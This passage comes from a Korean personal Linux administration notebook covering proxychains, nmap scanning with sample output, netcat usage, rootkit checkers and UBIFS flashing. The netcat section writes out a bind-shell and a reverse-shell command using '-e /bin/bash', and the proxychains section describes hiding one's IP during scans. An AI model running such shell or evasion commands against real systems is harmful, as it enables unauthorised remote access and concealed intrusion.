    ./xt_geoip_build GeoIPCountryWhois.csv
    mkdir -p /usr/share/xt_geoip/
    cp -rf {BE,LE} /usr/share/xt_geoip/ 
    ```
-   update\_GeoIP  
    
    ```text
    # /etc/cron.d/update_GeoIP
    
    # Global variables
    SHELL=/bin/bash
    PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/sbin
    MAILTO=root
    HOME=/
    
    25 4 5,10 * * root /usr/share/xt_geoip/GeoIP_update.sh >/dev/null 2>&1 
    ```


#### <span class="section-num">3.16.3</span> add-on {#add-on}

그밖에 psd, pknock 등의 많은 addon 이 존재한다.  
manuald을 참조 하라.  


### <span class="section-num">3.17</span> proxychains {#proxychains}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-04-21 화 11:43&gt;</span></span>  
proxy 서버를 이용하여 nmap 등의 프로그램에서 scan시 자신의  
ip를 숨길 수 있다.  
/etc/proxychains.conf 파일에서 proxy 서버를 추가하여사용한다. dns 항목도 주석처리 하여야 동작하였다.  
default proxy는 tor 로 되어있으나 작동하지 않았다.  


#### <span class="org-todo done DEFERRED">DEFERRED</span> <span class="section-num">3.17.1</span> tor 알아보기 {#tor-알아보기}


#### <span class="section-num">3.17.2</span> 사용법 {#사용법}

```text
// proxychains app_name
$ proxyshchains ssh user@some.host
```


#### <span class="section-num">3.17.3</span> 링크 {#링크}

[wonderhowto](http://null-byte.wonderhowto.com/how-to/hack-like-pro-evade-detection-using-proxychains-0154619/)  


### <span class="section-num">3.18</span> netcat으로 proxy 서버를 경유하여 ssh 연결하기 {#netcat으로-proxy-서버를-경유하여-ssh-연결하기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-04-21 화 11:52&gt;</span></span>  
ssh 의 Proxycommand 옵션에 netcat을 사용한다.  
bsd-netcat 패키지를 이용하여야 한다.  

```sh
$ ssh ybgwon.iptime.org -o \
'Proxcommand nc -X connect -x 128.199.182.138:3128 %h %p'
```


#### <span class="section-num">3.18.1</span> 링크 {#링크}

<http://offend.me.uk/blog/41/>  
<http://www.perkin.org.uk/posts/ssh-via-http-proxy-in-osx.html>  


### <span class="section-num">3.19</span> logwatch {#logwatch}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-04-21 화 15:02&gt;</span></span>  
log 파일을 분석해서 파일이나 메일로 출력한다.  


#### <span class="section-num">3.19.1</span> 주의 {#주의}

데비안에서는 기본 설치후 /var/cache/logwatch 디렉토리를 생성해 주어야 한다.  


#### <span class="section-num">3.19.2</span> 설정 {#설정}

/usr/share/logwatch/default.conf/logwatch.conf  
파일이 시스템 설정 파일이다.  
이 파일을 /etc/logwatch/conf 디렉토리에 복사해서수정하여 사용하면 된다.  
기본적으로 설치시 시스템 /etc/cron.daily/00logwatch 를설정하므로 메일 한번 등록한 사용자에게  
log 분석 메일이 간다.  


#### <span class="section-num">3.19.3</span> 명령어 {#명령어}

command line 에서 바로 실행하여 메일로 받거나파일로 출력할 수 있다  

```sh
$ sudo logwatch --detail high --mailto you@yourdomain.com \
--range today --service all --format html --output mail 
```


#### <span class="section-num">3.19.4</span> 링크 {#링크}

<http://xmodulo.com/monitor-log-file-linux-logwatch.html>  
<http://www.linux-mag.com/id/7800/>  
[digitaloccean](https://www.digitalocean.com/community/tutorials/how-to-install-and-use-logwatch-log-analyzer-and-reporter-on-a-vps)  


### <span class="section-num">3.20</span> mpv 에서 자막 한글이 표시 안될 때 {#mpv-에서-자막-한글이-표시-안될-때}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-04-21 화 23:51&gt;</span></span>  
$ mpv &#x2013;sub-codepage=cp949 test.avi  


### <span class="section-num">3.21</span> compiz alt tab 문제 {#compiz-alt-tab-문제}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-04-22 수 21:05&gt;</span></span>  
compiz 환경에서 mplayer등으로 동영상 재생중에 alt + tab 키로화면 전환을 하면 시스템이 멈추는 증상이 있었다.  
컴피즈 설정 관리자의 창관리 플러그인에서 프로그램 전환 플러그인을비활성화 하고 대신 고정된 응용프로그램 전환을 활성화 한다.  


### <span class="section-num">3.22</span> lsof 에서 gvfs 파일 시스템 경고 {#lsof-에서-gvfs-파일-시스템-경고}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-04-23 목 00:49&gt;</span></span>  
gvfs는 virtual 파일 시스템으로 root 유저에게도 권한이 없다.  
그래서 나오는 경고 메시지 이다.  
[stackexchange](http://unix.stackexchange.com/questions/171519/lsof-warning-cant-stat-fuse-gvfsd-fuse-file-system)  
[askubuntu](http://askubuntu.com/questions/23074/what-means-this-error-message-lsof-warning-cant-stat-fuse-gvfs-fuse-daemon)  


### <span class="section-num">3.23</span> gitlab update {#gitlab-update}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-04-26 일 14:33&gt;</span></span>  
시스템 업데이트 하면서 gitlab 이 동작하지 않아 gitlab  
패키지를 aur 에서 업데이트 하게 되었다.  
aur 패키지를 업데이트 하고 나서도 동작하지 않아 gitlab  
update 문서를 살펴 보았다.  

```text
0. Stop server

$ sudo systemctl stop redis gitlab-sidekiq gitlab-unicorn

//업그레이드 되면서 /etc/webapps/gitlab/secrets.yml 파일에
//secret key를 저장한다.

1. Backup

$ cd /usr/share/webapps/gitlab
$ sudo -u gitlab -H bundle exec rake gitlab:backup:create RAILS_ENV=production

2. Install libs, migrations, etc.

// PostgreSQL installations (이부분은 arch 패키지 설치시 진행하는 듯 하다.)
$ sudo -u gitlab -H bundle install --without development test mysql --deployment

// 아래 부분을 패키지 설치시 진행하는 지는 모르겠다.
// 그래서 수동으로 해 주었다.
// Run database migrations
$ sudo -u gitlab -H bundle exec rake db:migrate RAILS_ENV=production

// Clean up assets and cache
sudo -u gitlab -H bundle exec rake assets:clean assets:precompile cache:clear RAILS_ENV=production
```

위를 실행해서 인지 설정 부분(ex. secret 키가 바뀜것을 원복)을손대서 인지 다시 동작하였다.  


### <span class="section-num">3.24</span> virtualbox guest addition {#virtualbox-guest-addition}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-04-28 화 20:36&gt;</span></span>  
virtualbox guest os 를 설치하고 원할한 동작을 위해서 확장 팩(ext\_pack)을설치해야 한다. 이는 OS 에 있는 패키지로 설치할 수도 있고  
virtualbox 사이트에서 직접 받아오거나 virtualbox 관리 창에서업데이트를 통해 설치할 수 도 있다.  
확장 팩을 설치 하고 나면 guest OS의 관리 도구에서  
guest 확장 설치를 선택하면 VboxGuestAdditions.iso 파일이가상 시디롬에 삽입되고 윈도우에서는 자동 설치가 이루어 진다.  
(장치 => cd/dvd 장치 선택 부분에 VboxGuestAdditions.iso 파일이나타난다. 이 파일은 리눅스에서는 /usr/share/virtualbox/extensions  
디렉토리에 위치한다.)  
윈도우와는 달리 리눅스 guest 에서는 자동 설치가 되지 않으므로수동으로 다음 작업을 해주어야 한다.  

```text
// guest os 에 dkms 패키지가 설치 되지 않았다면 설치 하여야 한다.
$ sudo apt-get install dkms

// dkms 패키지가 없는 시스템에서는 아래를 실행하라고 한다.
// $ sudo /etc/init.d/vboxadd setup

// guest 확장이 마운트된 디렉토리로 이동하여 아래 실행
$ cd /mnt/cdrom 
$ sudo sh ./VBoxLinuxAdditions.run
```


### <span class="section-num">3.25</span> debian upgrade {#debian-upgrade}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-04-29 수 12:25&gt;</span></span>  
wheezy에서  jessie로 stable 릴리즈가 업그레이드 되었다.  
1년이 채 안되었는데, 데비안 stable 버전 릴리즈는 거의 2년정도걸리는데 이런 경우는 처음인 것 같다. 데비안은 새 버전이릴리즈 되어도 패키지 관리자에서 업그레이드가 가능하다.  
업그레이드 프로세스를 정리해 본다.  

1.  먼저 현재 패키지 상태를 점검한다.  
    
    ```text
    현재 시스템에 문제가 있는 패키지를 살펴본다.
    나는 gcj-jre 랑 filter 어쩌고 하는 패키지가 문제 있다고
    나왔다. 일단 그냥 삭제했다
    $ dpkg --audit
    
    홀드하여 업그레이드 안되게 한 패키지를 살펴본다..   
    $ dpkg --get-selections | grep 'hold$'
    
    홀드를 해제하는 명령
    $ sudo echo package_name hold | dpkg --set-selections
    
    현재 패키지 상태를 저장한다.
    $ dpkg --get-selections "*" > ~/curr-pkgs.txt
    ```

2.  sources.list 파일 수정  
    1.  /etc/apt/sources.list  
        wheezy를 jessie로 변경(또는 stable로 변경)
    
    2.  /etc/apt/sources.list.d/ 아래 모든 파일  
        wheezy를 jessie로 변경(또는 stable로 변경)
    
    3.  backport 등의 비공식적인 소스는 일단 주석처리

3.  하드디스크 용량이 충분한지 점검  
    $ df -h

4.  업그레이드 세션을 저장하기 위해 script 명령어 사용  
    
    ```text
    $ script -t 2>~/upgrade-jessiestep.time -a ~/upgrade-jessiestep.script
    t 옵션을 사용하면 scriptreplay 명령으로 재생할 수 있다.
    
    $ scriptreplay ~/upgrade-jessie.time ~/upgrade-jessie.script
    ```
5.  업그레이드 시작  
    
    ```text
    $ sudo apt-get update
    
    key 에러가 나면 아래 명령 실행
    $ sudo apt-get install debian-keyring debian-archive-keyring
    
    finally magic command
    $ sudo apt-get dist-upgrade
    ```


### <span class="section-num">3.26</span> i8042: No controller found {#i8042-no-controller-found}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-05-02 토 12:16&gt;</span></span>  
macbook 부팅시 위 메시지가 나타난다. i8042는 ps/2 키보드나마우스 드라이버다. 맥북에는 없으니 위메시지가 나타나는 것이당연하다. 에러가 아니라 경고 메시지다.  
<https://bugs.archlinux.org/task/27555>  


### <span class="section-num">3.27</span> live cd 활용하기 {#live-cd-활용하기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-05-10 일 11:55&gt;</span></span>  
grub 를 통해 하드디스크에 저장한 iso 이미지로 부팅할 수 있다.  
다음을 /etc/grub.d/40custom 파일에 저장하고  
update-grub 를 실행한다.  

```text
$ cat /etc/grub.d/40_custom
...
menuentry “Ubuntu 14.04 ISO” {
set isofile=”/home/name/Downloads/ubuntu-14.04.1-desktop-amd64.iso”
loopback loop (hd0,1)$isofile
linux (loop)/casper/vmlinuz.efi boot=casper iso-scan/filename=${isofile} quiet splash
initrd (loop)/casper/initrd.lz
}
$ sudo update-grub
```

<https://help.ubuntu.com/community/Grub2/ISOBoot>  
[howtogeek](http://www.howtogeek.com/196933/how-to-boot-linux-iso-images-directly-from-your-hard-drive/)  
<https://wiki.archlinux.org/index.php/Multiboot%5FUSB%5Fdrive#Debian>  


### <span class="section-num">3.28</span> nmap command {#nmap-command}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-05-13 수 12:25&gt;</span></span>  
네트워크 진단이나 침입의 목적으로 네트워크 스캔시 사용하는 도구  

1.  옵션없이 사용  
    nmap을 옵션없이 사용하면 많이 쓰이는 1000개의 포트에 대하여스캔한다. 느리다. nmap 테스트 서버에 사용시 5분이상 결렸다.  
    
    ```text
    ybgwon@12:04:37:[exploit]$ sudo  nmap scanme.nmap.org
    
    Starting Nmap 6.47 ( http://nmap.org ) at 2015-05-13 12:05 KST
    Nmap scan report for scanme.nmap.org (45.33.32.156)
    Host is up (0.16s latency).
    rDNS record for 45.33.32.156: li982-156.members.linode.com
    Not shown: 988 closed ports
    PORT      STATE    SERVICE
    22/tcp    open     ssh
    80/tcp    open     http
    135/tcp   filtered msrpc
    139/tcp   filtered netbios-ssn
    445/tcp   filtered microsoft-ds
    593/tcp   filtered http-rpc-epmap
    1037/tcp  filtered ams
    1434/tcp  filtered ms-sql-m
    2869/tcp  filtered icslap
    4444/tcp  filtered krb524
    9929/tcp  open     nping-echo
    31337/tcp open     Elite
    
    Nmap done: 1 IP address (1 host up) scanned in 311.28 seconds
    ```

2.  fast scan  
    F 옵션 사용시 많이 쓰이는 100 개의 포트만 스캔한다.  
    5초 정도 소요 되었다.  
    이와 달리 T5 옵션을 사용하면 timing telmplate을 설정하여빠른 스캔을 할 수 있다.  
    
    ```text
    ybgwon@12:10:41:[exploit]$ sudo  nmap -F scanme.nmap.org
    
    Starting Nmap 6.47 ( http://nmap.org ) at 2015-05-13 12:11 KST
    Nmap scan report for scanme.nmap.org (45.33.32.156)
    Host is up (0.15s latency).
    rDNS record for 45.33.32.156: li982-156.members.linode.com
    Not shown: 95 closed ports
    PORT    STATE    SERVICE
    22/tcp  open     ssh
    80/tcp  open     http
    135/tcp filtered msrpc
    139/tcp filtered netbios-ssn
    445/tcp filtered microsoft-ds
    
    Nmap done: 1 IP address (1 host up) scanned in 5.34 seconds
    
    ```
3.  호스트 디스커버리단순 온라인인 호스트만 검색할 때.  
    sn 옵션을 사용하며 이전 버전에서는 sP로 사용되어오래된 문서에서는 sP로 설명한다.  
    
    ```text
    ybgwon@12:43:35:[exploit]$ sudo nmap -sn 172.19.30.0/24
    
    Starting Nmap 6.47 ( http://nmap.org ) at 2015-05-13 12:43 KST
    Nmap scan report for 172.19.30.89
    Host is up.
    Nmap done: 256 IP addresses (1 host up) scanned in 10.51 seconds
    
    ```
4.  OS와 버전 탐지  
    A 옵션을 사용하며 A 옵션은 enable OS and version detection, script  
    scanning, and traceroute 를 수행한다고 메뉴얼에 나와 있다.  
    단순 OS 만 탐지 하려면 O 옵션만 사용하면 되고 버전 디텍션은  
    sV 옵션을 사용하면 된다.  
    
    ```text
    ybgwon@11:56:27:[exploit]$ sudo  nmap -A -T4 scanme.nmap.orgsudo  nmap -A -T4 scanme.nmap.org
    
    Starting Nmap 6.47 ( http://nmap.org ) at 2015-05-13 12:02 KST
    Warning: 45.33.32.156 giving up on port because retransmission cap hit (6).
    Nmap scan report for scanme.nmap.org (45.33.32.156)
    Host is up (0.16s latency).
    rDNS record for 45.33.32.156: li982-156.members.linode.com
    Not shown: 988 closed ports
    PORT      STATE    SERVICE        VERSION
    22/tcp    open     ssh            (protocol 2.0)
    | ssh-hostkey: 
    |   1024 ac:00:a0:1a:82:ff:cc:55:99:dc:67:2b:34:97:6b:75 (DSA)
    |   2048 20:3d:2d:44:62:2a:b0:5a:9d:b5:b3:05:14:c2:a6:b2 (RSA)
    |_  256 96:02:bb:5e:57:54:1c:4e:45:2f:56:4c:4a:24:b2:57 (ECDSA)
    80/tcp    open     http           Apache httpd 2.4.7 ((Ubuntu))
    |_http-title: Go ahead and ScanMe!
    135/tcp   filtered msrpc
    139/tcp   filtered netbios-ssn
    445/tcp   filtered microsoft-ds
    593/tcp   filtered http-rpc-epmap
    1037/tcp  filtered ams
    1434/tcp  filtered ms-sql-m
    2869/tcp  filtered icslap
    4444/tcp  filtered krb524
    9929/tcp  open     nping-echo     Nping echo
    31337/tcp open     ssl/ncat-chat  Ncat chat (users: nobody)
    | ssl-cert: Subject: commonName=localhost
    | Not valid before: 2015-04-16T05:34:45+00:00
    |_Not valid after:  2016-04-15T05:34:45+00:00
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
    SF-Port22-TCP:V=6.47%I=7%D=5/13%Time=5552BF27%P=i586-pc-linux-gnu%r(NULL,2
    SF:9,"SSH-2\.0-OpenSSH_6\.6\.1p1\x20Ubuntu-2ubuntu2\r\n");
    Device type: general purpose
    Running: Linux 3.X
    OS CPE: cpe:/o:linux:linux_kernel:3
    OS details: Linux 3.11 - 3.14
    Network Distance: 15 hops
    
    TRACEROUTE (using port 21/tcp)
    HOP RTT       ADDRESS
    1   2.05 ms   172.19.1.1
    2   ... 14
    15  166.01 ms li982-156.members.linode.com (45.33.32.156)
    
    OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 110.51 seconds
    
    ```
5.  기본 스캔  
    A 와 T4 타이밍 템플릿 4를 사용하여 상위 1000개 포트를 스캔.  
    
    ```text
    ybgwon@11:56:27:[exploit]$ sudo  nmap -A -T4 scanme.nmap.org
    
    Starting Nmap 6.47 ( http://nmap.org ) at 2015-05-13 12:02 KST
    Warning: 45.33.32.156 giving up on port because retransmission cap hit (6).
    Nmap scan report for scanme.nmap.org (45.33.32.156)
    Host is up (0.16s latency).
    rDNS record for 45.33.32.156: li982-156.members.linode.com
    Not shown: 988 closed ports
    PORT      STATE    SERVICE        VERSION
    22/tcp    open     ssh            (protocol 2.0)
    | ssh-hostkey: 
    |   1024 ac:00:a0:1a:82:ff:cc:55:99:dc:67:2b:34:97:6b:75 (DSA)
    |   2048 20:3d:2d:44:62:2a:b0:5a:9d:b5:b3:05:14:c2:a6:b2 (RSA)
    |_  256 96:02:bb:5e:57:54:1c:4e:45:2f:56:4c:4a:24:b2:57 (ECDSA)
    80/tcp    open     http           Apache httpd 2.4.7 ((Ubuntu))
    |_http-title: Go ahead and ScanMe!
    135/tcp   filtered msrpc
    139/tcp   filtered netbios-ssn
    445/tcp   filtered microsoft-ds
    593/tcp   filtered http-rpc-epmap
    1037/tcp  filtered ams
    1434/tcp  filtered ms-sql-m
    2869/tcp  filtered icslap
    4444/tcp  filtered krb524
    9929/tcp  open     nping-echo     Nping echo
    31337/tcp open     ssl/ncat-chat  Ncat chat (users: nobody)
    | ssl-cert: Subject: commonName=localhost
    | Not valid before: 2015-04-16T05:34:45+00:00
    |_Not valid after:  2016-04-15T05:34:45+00:00
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
    SF-Port22-TCP:V=6.47%I=7%D=5/13%Time=5552BF27%P=i586-pc-linux-gnu%r(NULL,2
    SF:9,"SSH-2\.0-OpenSSH_6\.6\.1p1\x20Ubuntu-2ubuntu2\r\n");
    Device type: general purpose
    Running: Linux 3.X
    OS CPE: cpe:/o:linux:linux_kernel:3
    OS details: Linux 3.11 - 3.14
    Network Distance: 15 hops
    
    TRACEROUTE (using port 21/tcp)
    HOP RTT       ADDRESS
    1   2.05 ms   172.19.1.1
    2   ... 14
    15  166.01 ms li982-156.members.linode.com (45.33.32.156)
    
    OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 110.51 seconds
    
    ```
6.  스크립트미리 빌드된 스크립트를 사용하여 다양한 스캔을 활용할 수 있다.  
    스크립트는 /usr/share/nmap/scripts 디렉토리에 위치하며 파일명이나 미리 정의된카테고리를 인자로 하여 콜 할 수 있다.  
    카테고리에는 auth,brute,malware,vuln,discovery,default 등등이있으니 메뉴얼을 참고하자. 또는 파일명으로 http\* 으로 해서 셸 확장문자를 사용하여 스캔할 수도 있다.  
    script-updatedb 명령을 사용하여 최신을 유지할 수 있다.  
    
    ```text
    ybgwon@01:05:48:[data]$ sudo nmap --script vuln localhost
    
    Starting Nmap 6.47 ( http://nmap.org ) at 2015-05-14 01:07 KST
    Pre-scan script results:
    | broadcast-avahi-dos: 
    |   Discovered hosts:
    |     192.168.0.2
    |   After NULL UDP avahi packet DoS (CVE-2011-1002).
    |_  Hosts are all up (not vulnerable).
    Nmap scan report for localhost (127.0.0.1)
    Host is up (0.0000080s latency).
    Other addresses for localhost (not scanned): 127.0.0.1
    rDNS record for 127.0.0.1: localhost.localdomain
    Not shown: 992 closed ports
    PORT     STATE SERVICE
    22/tcp   open  ssh
    25/tcp   open  smtp
    | smtp-vuln-cve2010-4344: 
    |_  The SMTP server is not Exim: NOT VULNERABLE
    80/tcp   open  http
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    |_http-fileupload-exploiter: 
    |_http-frontpage-login: false
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    139/tcp  open  netbios-ssn
    443/tcp  open  https
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    | http-enum: 
    |_  /robots.txt: Robots file
    |_http-fileupload-exploiter: 
    |_http-frontpage-login: false
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    445/tcp  open  microsoft-ds
    3306/tcp open  mysql
    5432/tcp open  postgresql
    
    Host script results:
    |_smb-vuln-ms10-054: false
    |_smb-vuln-ms10-061: false
    
    Nmap done: 1 IP address (1 host up) scanned in 97.20 seconds
    
    ```
7.  링크  
    <https://nmap.org/book/toc.html>  
    <http://www.cyberciti.biz/networking/nmap-command-examples-tutorials/>  
    [pentestlab](https://pentestlab.wordpress.com/2012/03/08/nmap-scripting-engine-basic-usage-2/)  
    <http://nmap.org/book/nse-usage.html>
8.  문제점  
    malware 옵션 사용시 http-google-malware 는 api 키를 등록해야 하고  
    /usr/share/nmap/nselib/shortport.lua 파일을 svn 버전으로교체해야 동작한다.  
    http-virustotal 도 api 키를 등록해야 한다.


### <span class="section-num">3.29</span> netcat command                                     :netcat:reverse shell: {#netcat-command-netcat-reverse-shell}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-05-14 목 12:55&gt;</span></span>  
gnu netcat 과 bsd netcat 은 서로 상이하다. 특히 gnu netcat에 있는  
e (execute command) 옵션이 bsd netcat에는 없다. 그밖에 동작방식도조금 차이가 난다. 또 파일 전송에서 gnu netcat에서는 w(timeout) 옵션을사용해도 클라이언트가 종료되지 않아 파일이 전송이 완료 되었는지확인 할 수 없다. 그래서 nmap 에서 ncat 프로그램을 만들었다.  
ncat은 e 옵션을 지원하고 &#x2013;recv-only 같은 옵션도 있다.  
proxy, ssl 도 지원하다. 한가지 단점이라면 ncat 4글자라 2글자 nc  
보다 타이핑을 많이해야 한다.  

1.  listen 모드로 9999 포트로 연결 대기  
    $ nc -v -l -p 9999
2.  connect 모드로 9999 포트에 연결  
    $ nc -v localhost 9999
3.  파일 전송  
    1.  서버 -> 클라이언트로 전송  
        -   서버측  
            $ nc -v -l -p 9999 < test.file
        -   클라이언트측  
            $ nc -v localhost 9999 > test.file  
            gnu netcat 은 파일전송이 완료되어도종료하지 않으므로 ncat이나 bsd-netcat 을 사용하자.  
            $ ncat -v &#x2013;recvonly localhost 9999 > test.file
    2.  클라이언트 -> 서버 전송  
        -   서버측  
            $ nc -l -v -p 9999 > test.file
        -   클라이언트측  
            $ nc -v -q 3 localhost 9999 < test.file

4.  백도어 셸  
    $ nc -v -l -p 9999 -e /bin/bash
5.  리버스 셸  
    $ nc -e /bin/bash localhost 9999


### <span class="section-num">3.30</span> rkhunter {#rkhunter}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-05-15 금 13:27&gt;</span></span>  
시스템에 설치된 루트킷을 검사한다.  


#### <span class="section-num">3.30.1</span> 설치 {#설치}

$ sudo apt install rkhunter  


#### <span class="section-num">3.30.2</span> 설정 {#설정}

데비안 패키지로 설치하면 디폴트 설정으로 사용하면 무방하다.  
/etc/default/rkhunter 파일에서 메일 이나 크론 등의 옵션을재정이 할 수 있다. 기본으로 cron 으로 매일 실행시키고,  
root 계정으로 메일이 온다.  
/var/log/rkhunter.log 파일에 로그를 기록한다.  


#### <span class="section-num">3.30.3</span> 수동 실행 {#수동-실행}

rkhunter -c -sk  
c 는 check옵션이고 sk는 check 실행시 엔터키로 넘어가는 부분을자동으로 넘긴다.  


### <span class="section-num">3.31</span> aide {#aide}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-05-15 금 16:14&gt;</span></span>  


#### <span class="section-num">3.31.1</span> 설치 {#설치}

$ sudo apt install aide  


#### <span class="section-num">3.31.2</span> 설정 {#설정}

$ sudo aideinit  


#### <span class="section-num">3.31.3</span> 에러 {#에러}

aideinit 에서 /dev atime in future 메시지가 나오면  
rtc 를 localtime 으로 설정해서 일 수 있다.  
hardware clock 을 utc 로 하기를 권장한다.  

```text
$ sudo timedatectl set-local-rtc 0
```

<https://wiki.archlinux.org/index.php/Time>  


#### <span class="section-num">3.31.4</span> 실행 {#실행}

$ sudo aide -c  


#### <span class="section-num">3.31.5</span> 참조 {#참조}

[snekul'blog](http://www.snekul.com/wordpress/blog/2012/09/27/using-aide-on-ubuntu-12-04-lts-precise-pangolin-and-debian-7-wheezy/)  


### <span class="section-num">3.32</span> 오른쪽 한글 키보드 매핑 {#오른쪽-한글-키보드-매핑}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-09-21 월 22:26&gt;</span></span>  
오른쪽 한글 키보드가 alt\_r로 셋팅되어 한영키를 쓸 수 없을 때 이전에는  
xmodmap 명령을 사용하여 제어가 되었으나 이제는 제어판에서 키보드를한국어 혼합용으로 셋팅해야 했다.  


### <span class="section-num">3.33</span> 드라이브가 마운트 되고 파일 매니저가 자동 열리지 않게 하기 {#드라이브가-마운트-되고-파일-매니저가-자동-열리지-않게-하기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-10-03 토 15:18&gt;</span></span>  

```text
$ dconf write /org/mate/desktop/media-handling/automount-open false
```

<https://wiki.archlinux.org/index.php/MATE#Auto%5Fopen%5Ffile%5Fmanager%5Fafter%5Fdrive%5Fmount>  


### <span class="section-num">3.34</span> UBIFS {#ubifs}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-10-10 토 15:17&gt;</span></span>  
flash 기반 차세대 파일시스템으로 yaff2,jffs2 보다 성능이 향상되었다.  


#### <span class="section-num">3.34.1</span> 커널및 u-boot 설정 {#커널및-u-boot-설정}

사용을 위해서는 커널및 u-boot 에서 관련 부분을 추가하여야 한다.  

1.   커널

    ```text
    * Enabling UBI support on MTD devices.
    
    Device Drivers --->
        Memory Technology Device (MTD) support  --->
            Enable UBI - Unsorted block images  --->
    
    * Enabling UBIFS file-system support.
    
    File systems  --->
        Miscellaneous filesystems  ---> 
             UBIFS file system support
    ```

2.   u-boot

    ```text
    #define CONFIG_CMD_NAND
    #define CONFIG_CMD_UBI
    #define CONFIG_CMD_UBIFS
    #define CONFIG_RBTREE
    #define CONFIG_MTD_DEVICE
    #define CONFIG_MTD_PARTITIONS
    #define CONFIG_CMD_MTDPARTS
    #define CONFIG_LZO
    ```


#### <span class="section-num">3.34.2</span> UBI Image 이용하기 {#ubi-image-이용하기}

1.   ubifs image 만들기

    먼저 mkfs.ubifs를 사용하여 파일시스템을 빌드한다. 옵션이 많은데 mtdinfo 명령을사용하여 옵션에 필요한 정보를 메모해 두어야 한다. mtdinfo 가 없다면 여기저기서정보를 메모해 두는 수 밖에 없다.  
    
    1.   옵션
    
        -r path to your rootfs  
        -m min io size  
        -e LEB size  
        -c Eraseblocks count  
        -o path to output ubifs.img  
    
    2.   명령
    
        ```text
        $ sudo mkfs.ubifs -r mango -F -o ubifs.img -m 2048 -e 129024 -c 2012
        ```

2.   ubi image 만들기

    빌드된 ubifs 이미지를 사용하여 ubi image를 만든다.  
    
    1.   ubinize.cfg
    
        ```text
        [ubifs]                <== Section header
        mode=ubi              <== Volume mode (other option is static)
        image=ubifs.img       <== Source image
        vol_id=0              <== Volume ID in UBI image
        vol_size=244MiB       <== Volume size
        vol_type=dynamic      <== Allow for dynamic resize
        vol_name=rootfs       <== Volume name
        vol_flags=autoresize  <== Autoresize volume at first mount
        ```
    
    2.   옵션
    
        -o Output file  
        -m Minimum flash I/O size of 2KiB page  
        -p Size of the physical eraseblock of the flash  
        -O VID header offset  
        -s sbu-page-size  
    
    3.   명령
    
        ```text
        $ sudo ubinize -o ubi.img -m 2048 -p 128KiB -s 512 -O 512 ubinize.cfg
        ```

3.   ubi image flash에 쓰기

    ```text
    # ubiformat /dev/mtd2 -f ubi.img -s 512 -O 512
    ```

4.   mount 하여 사용

    ```text
    # ubiattach /dev/ubi_ctrl -m2
    # mount -t ubifs ubi0:rootfs /mnt/
    ```

5.   u-boot 옵션

    ```text
    setenv bootargs console=ttyO0,115200  ubi.mtd=X,YYYY rootfstype=ubifs root=ubi0:rootfs rw
    ```
    
    X = mtd partion number  
    YYYY = NAND page size  
    
    ```text
    setenv bootargs console=ttyO0,115200 root=ubi0:rootfs ubi.mtd =2,2048 rw rootfstype=ubifs ip=dhcp
    ```


#### <span class="section-num">3.34.3</span> 포멧하여 사용하기 {#포멧하여-사용하기}

1.   mtd 파티션 포멧

    1.   옵션
    
        -s sub-page-size  
        -O vid-hdr-offset  
    
    2.   명령
    
        ```text
        # ubiformat /dev/mtd2 -s 512 -O 512
        ```

2.   mtd 디바이스에 연결

    1.   옵션
    
        -m mtd device number  
    
    2.   명령
    
        ```text
        # ubiattach /dev/ubi_ctrl -m 2 -O 512
        ```

3.   ubi 볼륨을 만든다.

    1.   옵션
    
        -N volume name  
        -s size  
        -m max available size  
    
    2.   명령
    
        ```text
        # ubimkvol /dev/ubi0 -N rootfs -m
        ```

4.   마운트하여 사용

    1.   옵션
    
        mount -t ubifs ubi0:<label> /mount/point  
        lable - volume name  
    
    2.   명령
    
        ```text
        # mount -t ubifs ubi0:rootfs /mnt/mtd
        # cd /mnt/mtd
        # tar xvf ~/gnome.tgz
        ```

5.   연결해제

    1.   옵션
    
        -m mtd number  
    
    2.   명령
    
        ```text
        # umount /mnt/mtd
        # ubidetach /dev/ubi_ctrl -m 2
        ```

6.   reset후 ubi image로 부팅하기위한 uboot 옵션

    ```text
    setenv bootargs "ubi.mtd=2 root=ubi0:rootfs rootfstype=ubifs init=/sbin/init console=ttySAC1,115200"
    ```

7.   참조

    <http://processors.wiki.ti.com/index.php/UBIFS%5FSupport>  
    <http://wiki.atlas-embedded.com/index.php?title=Creating%5Fand%5FFlashing%5FUBIFS%5Fwith%5FMTD%5FUtils>  


#### <span class="section-num">3.34.4</span> IMX28 {#imx28}

imx28 보드에서 MICRON MT29F4G08ABADAWP nand flash ubifs 설정방법이다.  

1.  Edit ~/ltib/bin/Ltibutils.pm  
    rootfs.ubifs 삭제하는 부분을 주석처리  
    
    ```text
    line 909 : #    rm $tdir/rootfs.ubifs
    ```
2.  ltib ubi 설정 수정  
    
    ```text
    $ ltib -c => Target Image Generation
    Target image : ubifs
    PEB : 128KiB
    LEB : 126976
    LEB Count : 4096
